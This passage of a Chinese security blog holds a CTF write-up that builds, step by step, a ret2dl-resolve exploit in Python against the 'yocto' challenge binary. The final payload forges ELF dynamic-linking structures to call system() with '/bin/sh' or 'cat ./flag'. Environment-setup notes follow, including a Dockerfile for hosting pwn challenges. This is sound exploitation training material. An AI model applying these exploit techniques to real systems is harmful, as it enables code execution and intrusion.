<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: 1111.2222.3333.4444</span><br><span class="line">    ebp-0xc	 	#12		edx		2222</span><br><span class="line">    ebp-0x10	#16		ecx		3333</span><br><span class="line">    ebp-0x14	#20     eax		1111</span><br><span class="line">then...</span><br><span class="line">call exc(edx,eax)</span><br><span class="line">    0000| 0xbffff9dc --&gt; 0x8ae 		# 2222</span><br><span class="line">    0004| 0xbffff9e0 --&gt; 0x457 		# 1111</span><br><span class="line">    0008| 0xbffff9e4 --&gt; 0x80495c9 (&quot;.3333.4444\n&quot;) </span><br><span class="line">    0012| 0xbffff9e8 --&gt; 0x457 </span><br><span class="line">    0016| 0xbffff9ec --&gt; 0xd05 </span><br><span class="line">    0020| 0xbffff9f0 --&gt; 0x8ae</span><br></pre></td></tr></table></figure>
<h4 id="0x01-利用思路"><a href="#0x01-利用思路" class="headerlink" title="0x01:利用思路"></a>0x01:利用思路</h4><p>使用<code>ret 2 dl-reslove</code>技术，伪造<code>reloc</code>和<code>dynsym</code>和<code>dynstr</code>，然后控制返回地值为<code>plt[0]</code>并且设置好参数，使得程序去查找并调用的是<code>system()</code>函数，并执行我们设置的命令。</p>
<h4 id="0x02-exp构造过程"><a href="#0x02-exp构造过程" class="headerlink" title="0x02:exp构造过程"></a>0x02:exp构造过程</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line">__author__ = <span class="string">"muhe"</span></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">args = [<span class="string">'./yocto'</span>]</span><br><span class="line"></span><br><span class="line">io = zio(args, timeout=<span class="number">100000</span>)</span><br><span class="line"></span><br><span class="line">plt_addr     = <span class="number">0x080482a0</span>     <span class="comment"># objdump -s -j .plt yocto</span></span><br><span class="line">rel_plt_addr = <span class="number">0x08048270</span>     <span class="comment"># objdump -s -j .rel.plt yocto</span></span><br><span class="line">dynsym_addr  = <span class="number">0x0804818c</span>     <span class="comment"># objdump -s -j .dynsym yocto</span></span><br><span class="line">dynstr_addr  = <span class="number">0x080481fc</span>     <span class="comment"># objdump -s -j .dynstr  yocto</span></span><br><span class="line">base_addr    = <span class="number">0x080495C0</span>     <span class="comment"># glob</span></span><br><span class="line">atoi_got_plt = <span class="number">0x08049548</span></span><br><span class="line">atoi_plt     = <span class="number">0x080482e0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake reloc  here</span></span><br><span class="line">fake_reloc_addr = base_addr + <span class="number">16</span></span><br><span class="line">reloc_offset = fake_reloc_addr - rel_plt_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake dynsym here</span></span><br><span class="line"><span class="comment">#fake_dynsym_addr = base_addr + ?</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake dynstr here</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">input: 1111.2222.3333</span></span><br><span class="line"><span class="string">	push    eax    1111</span></span><br><span class="line"><span class="string">	push    edx	   2222</span></span><br><span class="line"><span class="string">	jmp     ecx    3333</span></span><br><span class="line"><span class="string">call ecx(edx,eax)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">payload =  str(atoi_plt)     <span class="comment">#eax</span></span><br><span class="line">payload += <span class="string">'.'</span></span><br><span class="line">payload += str(reloc_offset) <span class="comment">#edx</span></span><br><span class="line">payload += <span class="string">'.'</span></span><br><span class="line">payload += str(plt_addr)     <span class="comment">#ecx</span></span><br><span class="line"></span><br><span class="line">io.writeline(payload)</span><br><span class="line">raw_input(<span class="string">'waiting for debugger attach...'</span>)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/yocto/exp0.jpg" alt="exp0">check没过，继续构造。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line">__author__ = <span class="string">"muhe"</span></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">args = [<span class="string">'./yocto'</span>]</span><br><span class="line"></span><br><span class="line">io = zio(args, timeout=<span class="number">100000</span>)</span><br><span class="line"></span><br><span class="line">plt_addr     = <span class="number">0x080482a0</span>     <span class="comment"># objdump -s -j .plt yocto</span></span><br><span class="line">rel_plt_addr = <span class="number">0x08048270</span>     <span class="comment"># objdump -s -j .rel.plt yocto</span></span><br><span class="line">dynsym_addr  = <span class="number">0x0804818c</span>     <span class="comment"># objdump -s -j .dynsym yocto</span></span><br><span class="line">dynstr_addr  = <span class="number">0x080481fc</span>     <span class="comment"># objdump -s -j .dynstr  yocto</span></span><br><span class="line">base_addr    = <span class="number">0x080495C0</span>     <span class="comment"># glob</span></span><br><span class="line">atoi_got_plt = <span class="number">0x08049548</span></span><br><span class="line">atoi_plt     = <span class="number">0x080482e0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake reloc  here</span></span><br><span class="line">fake_reloc_addr = base_addr + <span class="number">36</span>   <span class="comment"># 0x80495e4</span></span><br><span class="line">reloc_offset = fake_reloc_addr - rel_plt_addr <span class="comment"># 0x1374</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake dynsym here</span></span><br><span class="line">fake_dynsym_addr = base_addr + <span class="number">60</span></span><br><span class="line"><span class="comment"># const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span></span><br><span class="line">r_info = (fake_dynsym_addr - dynsym_addr) &lt;&lt; <span class="number">8</span> | <span class="number">0x7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake dynstr here</span></span><br><span class="line">fake_dynstr_addr = bass_addr + <span class="number">45</span>   <span class="comment"># 0x80495ed</span></span><br><span class="line">st_name = fake_dynstr_addr - dynstr_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bin_sh_addr = bass_addr + <span class="number">76</span>        <span class="comment"># 0x804960c</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">input: 1111.2222.3333</span></span><br><span class="line"><span class="string">	push    eax    1111</span></span><br><span class="line"><span class="string">	push    edx	   2222</span></span><br><span class="line"><span class="string">	jmp     ecx    3333</span></span><br><span class="line"><span class="string">call ecx(edx,eax)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">payload =  str(atoi_plt)     <span class="comment">#eax</span></span><br><span class="line">payload += <span class="string">'.'</span></span><br><span class="line">payload += str(reloc_offset) <span class="comment">#edx</span></span><br><span class="line">payload += <span class="string">'.'</span></span><br><span class="line">payload += str(plt_addr)     <span class="comment">#ecx</span></span><br><span class="line">raw_input(<span class="string">'waiting for debugger attach...'</span>)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">"AAAA"</span></span><br><span class="line">payload += <span class="string">"BBBB"</span></span><br><span class="line">payload += <span class="string">"CCCC"</span></span><br><span class="line">payload += <span class="string">"DDDD"</span></span><br><span class="line">payload += <span class="string">"EEEE"</span></span><br><span class="line">payload += <span class="string">"FFFF"</span></span><br><span class="line">payload += <span class="string">"GGGG"</span></span><br><span class="line">payload += <span class="string">"HHHH"</span></span><br><span class="line">payload += <span class="string">"IIII"</span></span><br><span class="line">payload += <span class="string">"JJJJ"</span></span><br><span class="line">payload += <span class="string">"KKKK"</span></span><br><span class="line">payload += <span class="string">"LLLL"</span></span><br><span class="line">payload += <span class="string">"MMMM"</span></span><br><span class="line">payload += <span class="string">"NNNN"</span></span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line"></span><br><span class="line">io.writeline(payload)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>

<p>过了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br></pre></td></tr></table></figure>

<p>最低位是不是7的check。</p>
<p>变换exp继续调试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">....</span><br><span class="line"></span><br><span class="line">payload =  str(atoi_plt)     <span class="comment">#eax</span></span><br><span class="line">payload += <span class="string">'.'</span></span><br><span class="line">payload += str(reloc_offset) <span class="comment">#edx</span></span><br><span class="line">payload += <span class="string">'.'</span></span><br><span class="line">payload += str(plt_addr)     <span class="comment">#ecx</span></span><br><span class="line"><span class="comment">#raw_input('waiting for debugger attach...')</span></span><br><span class="line">io.gdb_hint([<span class="number">0x080483F5</span>])</span><br><span class="line">payload += <span class="string">"AAAA"</span></span><br><span class="line">payload += <span class="string">"BBBB"</span></span><br><span class="line">payload += <span class="string">"CCCC"</span></span><br><span class="line"><span class="comment">#payload += "DDDD"</span></span><br><span class="line"><span class="comment">#payload += "EEEE"  # r_info</span></span><br><span class="line">payload += l32(atoi_got_plt)</span><br><span class="line">payload += l32(r_info)</span><br><span class="line">payload += <span class="string">"FFFF"</span></span><br><span class="line">payload += <span class="string">"GGGG"</span></span><br><span class="line">payload += <span class="string">"HHHH"</span></span><br><span class="line">payload += <span class="string">"IIII"</span></span><br><span class="line">payload += <span class="string">"JJJJ"</span></span><br><span class="line">payload += <span class="string">"KKKK"</span></span><br><span class="line">payload += <span class="string">"LLLL"</span></span><br><span class="line">payload += <span class="string">"MMMM"</span></span><br><span class="line">payload += <span class="string">"NNNN"</span></span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line"></span><br><span class="line">io.writeline(payload)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>

<p>变换payload部分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =  str(atoi_plt)     <span class="comment">#eax</span></span><br><span class="line">payload += <span class="string">'.'</span></span><br><span class="line">payload += str(reloc_offset) <span class="comment">#edx</span></span><br><span class="line">payload += <span class="string">'.'</span></span><br><span class="line">payload += str(plt_addr)     <span class="comment">#ecx</span></span><br><span class="line"><span class="comment">#raw_input('waiting for debugger attach...')</span></span><br><span class="line">io.gdb_hint([<span class="number">0x080483F5</span>])</span><br><span class="line">payload += <span class="string">"AAAA"</span></span><br><span class="line">payload += <span class="string">"BBBB"</span></span><br><span class="line">payload += <span class="string">"CCCC"</span></span><br><span class="line"><span class="comment">#payload += "DDDD"</span></span><br><span class="line"><span class="comment">#payload += "EEEE"  # r_info</span></span><br><span class="line">payload += l32(atoi_got_plt)</span><br><span class="line">payload += l32(r_info)</span><br><span class="line">payload += <span class="string">"FFFF"</span></span><br><span class="line">payload += <span class="string">"GGGG"</span></span><br><span class="line">payload += <span class="string">"HHHH"</span></span><br><span class="line">payload += <span class="string">"IIII"</span></span><br><span class="line">payload += <span class="string">"JJJJ"</span> <span class="comment"># fake_dynsym_addr</span></span><br><span class="line">payload += <span class="string">"KKKK"</span></span><br><span class="line">payload += <span class="string">"LLLL"</span></span><br><span class="line"><span class="comment">#payload += "MMMM"</span></span><br><span class="line">payload += l32(<span class="number">0</span>)</span><br><span class="line">payload += <span class="string">"NNNN"</span></span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line"></span><br><span class="line">io.writeline(payload)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/yocto/dl_lookup_wrong.jpg" alt="dl_lookup_wrong"></p>
<p>解决办法：正常调试这个过程，看看引起异常的部分在哪里。</p>
<p>st_name设置的问题，修改正确的位置，改变payload为如下，继续调试。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =  str(atoi_plt)     <span class="comment">#eax</span></span><br><span class="line">payload += <span class="string">'.'</span></span><br><span class="line">payload += str(reloc_offset) <span class="comment">#edx</span></span><br><span class="line">payload += <span class="string">'.'</span></span><br><span class="line">payload += str(plt_addr)     <span class="comment">#ecx</span></span><br><span class="line"><span class="comment">#raw_input('waiting for debugger attach...')</span></span><br><span class="line">io.gdb_hint([<span class="number">0x080483F5</span>])</span><br><span class="line">payload += <span class="string">"AAAA"</span></span><br><span class="line">payload += <span class="string">"BBBB"</span></span><br><span class="line">payload += <span class="string">"CCCC"</span></span><br><span class="line">payload += l32(atoi_got_plt) <span class="comment">#fake_reloc</span></span><br><span class="line">payload += l32(r_info)</span><br><span class="line">payload += <span class="string">"FFFF"</span>    <span class="comment"># fake_dynstr_addr</span></span><br><span class="line">payload += <span class="string">"GGGG"</span></span><br><span class="line">payload += <span class="string">"HHHH"</span></span><br><span class="line">payload += <span class="string">"IIII"</span></span><br><span class="line">payload += l32(st_name) <span class="comment"># fake_dynsym_addr</span></span><br><span class="line">payload += <span class="string">"KKKK"</span></span><br><span class="line">payload += <span class="string">"LLLL"</span></span><br><span class="line">payload += l32(<span class="number">0</span>)</span><br><span class="line">payload += <span class="string">"NNNN"</span></span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line"></span><br><span class="line">io.writeline(payload)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<p>这样修改之后发现:<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/yocto/undefine_symbol.jpg" alt="undefine_symbol"><br>替换system过去，应该就可以找到system的地址了。</p>
<p>然而…一口老血要喷出来了</p>
<p>这是修改之后的payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">payload =  str(atoi_plt)     <span class="comment">#eax</span></span><br><span class="line">payload += <span class="string">'.'</span></span><br><span class="line">payload += str(reloc_offset) <span class="comment">#edx</span></span><br><span class="line">payload += <span class="string">'.'</span></span><br><span class="line">payload += str(plt_addr)     <span class="comment">#ecx</span></span><br><span class="line"><span class="comment">#raw_input('waiting for debugger attach...')</span></span><br><span class="line">io.gdb_hint([<span class="number">0x080483F5</span>])</span><br><span class="line"></span><br><span class="line">payload += <span class="string">"AAAA"</span></span><br><span class="line">payload += <span class="string">"\x90"</span> * (<span class="number">36</span> - len(payload))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$1 --&gt; %d"</span> % (len(payload))</span><br><span class="line">payload += l32(atoi_got_plt) <span class="comment">#fake_reloc</span></span><br><span class="line">payload += l32(r_info)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">"\x90"</span>*(<span class="number">45</span> - len(payload))  <span class="comment"># fake_dynstr_addr  string: "system\x00" here</span></span><br><span class="line">payload += <span class="string">"system\x00"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"$2 --&gt; %d"</span> % (len(payload))</span><br><span class="line"></span><br><span class="line">payload += <span class="string">"\x90"</span> * (<span class="number">60</span> - len(payload))</span><br><span class="line">payload += l32(st_name) <span class="comment"># fake_dynsym_addr</span></span><br><span class="line">payload += l32(<span class="number">0</span>)</span><br><span class="line">payload += l32(<span class="number">0</span>)</span><br><span class="line">payload += l32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"$3 --&gt; %d"</span> % (len(payload))</span><br><span class="line"></span><br><span class="line">payload += <span class="string">"\x90"</span> * (<span class="number">80</span> - len(payload))</span><br><span class="line"></span><br><span class="line">io.writeline(payload)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/yocto/undefine_symbol_system.jpg" alt="undefine_symbol_system"></p>
<p>单步看看发生了什么吧….</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/yocto/dl_lookup_func.jpg" alt="dl_lookup_func"></p>
<p>函数的参数如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_dl_lookup_symbol_x (undef_name=<span class="number">0x80495ed</span> &lt;glob+<span class="number">45</span>&gt; <span class="string">"system"</span>, undef_map=undef_map@entry=<span class="number">0xb7779938</span>, ref=ref@entry=<span class="number">0xbff81f38</span>, symbol_scope=<span class="number">0xb7779af0</span>, version=<span class="number">0xb7753c98</span>, </span><br><span class="line">    type_class=type_class@entry=<span class="number">0x1</span>, flags=flags@entry=<span class="number">0x1</span>, skip_map=skip_map@entry=<span class="number">0x0</span>)</span><br></pre></td></tr></table></figure>

<p>对比源码里这个函数的原型:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">4444    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>

<p>返回值是libc的基地址。</p>
<p>对比了下9k师傅的exp，应该是dynsym的伪造块没有做对齐…原因暂时没搞清楚，先加上对齐在说。</p>
<p>最终exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line">__author__ = <span class="string">"muhe"</span></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">args = [<span class="string">'./yocto'</span>]</span><br><span class="line"></span><br><span class="line">io = zio(args, timeout=<span class="number">100000</span>)</span><br><span class="line"></span><br><span class="line">plt_addr     = <span class="number">0x080482a0</span>     <span class="comment"># objdump -s -j .plt yocto</span></span><br><span class="line">rel_plt_addr = <span class="number">0x08048270</span>     <span class="comment"># objdump -s -j .rel.plt yocto</span></span><br><span class="line">dynsym_addr  = <span class="number">0x0804818c</span>     <span class="comment"># objdump -s -j .dynsym yocto</span></span><br><span class="line">dynstr_addr  = <span class="number">0x080481fc</span>     <span class="comment"># objdump -s -j .dynstr  yocto</span></span><br><span class="line">base_addr    = <span class="number">0x080495C0</span>     <span class="comment"># glob</span></span><br><span class="line">atoi_got_plt = <span class="number">0x08049548</span></span><br><span class="line">atoi_plt     = <span class="number">0x080482e0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake reloc  here</span></span><br><span class="line">fake_reloc_addr = base_addr + <span class="number">36</span>   <span class="comment"># 0x80495e4</span></span><br><span class="line">reloc_offset = fake_reloc_addr - rel_plt_addr <span class="comment"># 0x1374</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake dynsym here</span></span><br><span class="line">fake_dynsym_addr = base_addr + <span class="number">60</span></span><br><span class="line">align_dynsym = <span class="number">0x10</span> - ((fake_dynsym_addr-dynsym_addr) &amp; <span class="number">0xF</span>)</span><br><span class="line">fake_dynsym_addr += align_dynsym</span><br><span class="line"><span class="comment"># const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span></span><br><span class="line">r_info = ((fake_dynsym_addr - dynsym_addr)/<span class="number">0x10</span>)&lt;&lt; <span class="number">8</span> | <span class="number">0x7</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake dynstr here</span></span><br><span class="line">fake_dynstr_addr = base_addr + <span class="number">45</span>   <span class="comment"># 0x80495ed</span></span><br><span class="line">st_name = fake_dynstr_addr - dynstr_addr <span class="comment"># 0x13f1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bin_sh_addr = base_addr + 76        # 0x804960c</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">input: 1111.2222.3333</span></span><br><span class="line"><span class="string">	push    eax    1111</span></span><br><span class="line"><span class="string">	push    edx	   2222</span></span><br><span class="line"><span class="string">	jmp     ecx    3333</span></span><br><span class="line"><span class="string">call ecx(edx,eax)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">payload =  str(atoi_plt)     <span class="comment">#eax</span></span><br><span class="line">payload += <span class="string">'.'</span></span><br><span class="line">payload += str(reloc_offset) <span class="comment">#edx</span></span><br><span class="line">payload += <span class="string">'.'</span></span><br><span class="line">payload += str(plt_addr)     <span class="comment">#ecx</span></span><br><span class="line"><span class="comment">#raw_input('waiting for debugger attach...')</span></span><br><span class="line">io.gdb_hint([<span class="number">0x080483F5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload += "AAAA"</span></span><br><span class="line"><span class="comment">#payload += ";cat ./flag\x00"</span></span><br><span class="line">payload += <span class="string">";/bin/sh\x00"</span></span><br><span class="line">payload += <span class="string">"\x90"</span> * (<span class="number">36</span> - len(payload))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$1 --&gt; %d"</span> % (len(payload))</span><br><span class="line">payload += l32(atoi_got_plt) <span class="comment">#fake_reloc</span></span><br><span class="line">payload += l32(r_info)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">"\x90"</span>*(<span class="number">45</span> - len(payload))  <span class="comment"># fake_dynstr_addr  string: "system\x00" here</span></span><br><span class="line">payload += <span class="string">"system\x00"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"$2 --&gt; %d"</span> % (len(payload))</span><br><span class="line"></span><br><span class="line">payload += <span class="string">"\x90"</span> * (<span class="number">60</span> - len(payload))</span><br><span class="line">payload += <span class="string">"\x90"</span> * align_dynsym</span><br><span class="line">payload += l32(st_name) <span class="comment"># fake_dynsym_addr</span></span><br><span class="line">payload += l32(<span class="number">0</span>)</span><br><span class="line">payload += l32(<span class="number">0</span>)</span><br><span class="line">payload += l32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"$3 --&gt; %d"</span> % (len(payload))</span><br><span class="line"></span><br><span class="line">payload += <span class="string">"\x90"</span> * (<span class="number">80</span> - len(payload))</span><br><span class="line"></span><br><span class="line">io.writeline(payload)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>

<p>读文件的exp效果</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/yocto/read_flag.jpg" alt="read_flag"></p>
<p>起shell的效果</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/yocto/exp_get_shell.jpg" alt="exp_get_shell"></p>
<h4 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03:参考"></a>0x03:参考</h4><ul>
<li>9k师傅的exp</li>
</ul>
<ul>
<li>bigtang师傅drops的文章</li>
<li>ELF如何摧毁圣诞 ——通过ELF动态装载机制进行漏洞利用</li>
<li>Phrack文章</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf writeup</tag>
        <tag>ret 2 dl-resolve</tag>
      </tags>
  </entry>
  <entry>
    <title>一些环境配置遇到的坑(持续更新)</title>
    <url>/2016/09/24/%E4%B8%80%E4%BA%9B%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<p>主要是针对一些环境配置的小问题的记录</p>
<a id="more"></a>

<h4 id="1-启用了win10-的linux子系统后，修改默认终端为zsh"><a href="#1-启用了win10-的linux子系统后，修改默认终端为zsh" class="headerlink" title="1. 启用了win10 的linux子系统后，修改默认终端为zsh"></a>1. 启用了win10 的linux子系统后，修改默认终端为zsh</h4><p>按照以往的套路，使用chsh -s /bin/zsh或者直接修改/etc/password里的配置都是可以的，但是这种方法对win10的linux子系统并不生效，重启之后还是默认的bash。<br>​    解决办法: 在~/.bashrc中添加如下代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if [ -t 1 ];then</span><br><span class="line">exec zsh</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p>就可以啦~<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/env_config_log/%E9%85%8D%E7%BD%AE.jpg"></p>
<h4 id="2-ubuntu16-04安装docker遇到问题"><a href="#2-ubuntu16-04安装docker遇到问题" class="headerlink" title="2. ubuntu16.04安装docker遇到问题"></a>2. ubuntu16.04安装docker遇到问题</h4><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/env_config_log/docker_install_error.png"><br>解决办法: 在/etc/apt/sources.list文件中添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;cz.archive.ubuntu.com&#x2F;ubuntu trusty main</span><br></pre></td></tr></table></figure>
<p>然后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install libsystemd-journal0</span><br><span class="line">$ sudo apt-get install docker-engine</span><br></pre></td></tr></table></figure>

<h4 id="3-使用docker来配置pwn服务"><a href="#3-使用docker来配置pwn服务" class="headerlink" title="3. 使用docker来配置pwn服务"></a>3. 使用docker来配置pwn服务</h4><pre><code>环境说明</code></pre>
<ul>
<li>   ubuntu 16.04 LTS</li>
</ul>
<pre><code>文件目录</code></pre>
<ul>
<li>   Dockerfile</li>
<li>   source.list</li>
<li>   start.sh</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="comment">#muhe docker study!  </span></span><br><span class="line">FROM ubuntu:14.04 </span><br><span class="line">MAINTAINER muhe &lt;o0xmuhe@gmail.com&gt; </span><br><span class="line"></span><br><span class="line">COPY ./sources.list /etc/apt/sources.list</span><br><span class="line">RUN apt-get update </span><br><span class="line">RUN apt-get -y dist-upgrade</span><br><span class="line">RUN apt-get install -y socat </span><br><span class="line"></span><br><span class="line">RUN useradd -m ctf</span><br><span class="line"></span><br><span class="line">COPY ./bin/ /home/ctf/</span><br><span class="line">COPY ./start.sh /start.sh</span><br><span class="line"></span><br><span class="line">RUN chmod +x /start.sh</span><br><span class="line">RUN chown -R root:ctf /home/ctf</span><br><span class="line">RUN chmod -R 750 /home/ctf</span><br><span class="line">RUN chmod 740 /home/ctf/flag</span><br><span class="line">RUN cp -R /lib* /home/ctf</span><br><span class="line">RUN cp -R /usr/lib* /home/ctf</span><br><span class="line">RUN mkdir /home/ctf/bin</span><br><span class="line">RUN cp /bin/sh /home/ctf/bin</span><br><span class="line">RUN cp /bin/ls /home/ctf/bin</span><br><span class="line">RUN cp /bin/cat /home/ctf/bin</span><br><span class="line"></span><br><span class="line">WORKDIR /home/ctf</span><br><span class="line"></span><br><span class="line">CMD [<span class="string">"/start.sh"</span>]</span><br><span class="line">EXPOSE 10001</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; trusty main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; trusty-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; trusty-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; trusty-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; trusty-backports main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; trusty main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; trusty-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; trusty-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; trusty-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; trusty-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">socat TCP4-LISTEN:10001,reuseaddr,fork EXEC:/home/ctf/helloworld</span><br></pre></td></tr></table></figure>

<p>最后使用<code>docker build -t ubuntu/pwn .</code>来构建镜像就可以了。</p>
<h4 id="4-在win10子系统上使用pwntools"><a href="#4-在win10子系统上使用pwntools" class="headerlink" title="4. 在win10子系统上使用pwntools"></a>4. 在win10子系统上使用pwntools</h4><p>win10子系统+cmder配置好了之后省得开虚拟机了…用来搞pwn也很爽。<br>今天发现一个问题，pwntools用process启动程序的时候，遇到如下问题：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python exp.py</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"exp.py"</span>, line 9, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    p = process(<span class="string">'./jmper'</span>)</span><br><span class="line">  File <span class="string">"/usr/local/lib/python2.7/dist-packages/pwntools-3.6.0.dev0-py2.7.egg/pwnlib/tubes/process.py"</span>, line 269, <span class="keyword">in</span> __init__</span><br><span class="line">    stdin, stdout, stderr, master, slave = self._handles(*handles)</span><br><span class="line">  File <span class="string">"/usr/local/lib/python2.7/dist-packages/pwntools-3.6.0.dev0-py2.7.egg/pwnlib/tubes/process.py"</span>, line 605, <span class="keyword">in</span> _handles</span><br><span class="line">    tty.setraw(master)</span><br><span class="line">  File <span class="string">"/usr/lib/python2.7/tty.py"</span>, line 28, <span class="keyword">in</span> setraw</span><br><span class="line">    tcsetattr(fd, when, mode)</span><br><span class="line">termios.error: (22, <span class="string">'Invalid argument'</span>)</span><br></pre></td></tr></table></figure>
<p>解决办法：</p>
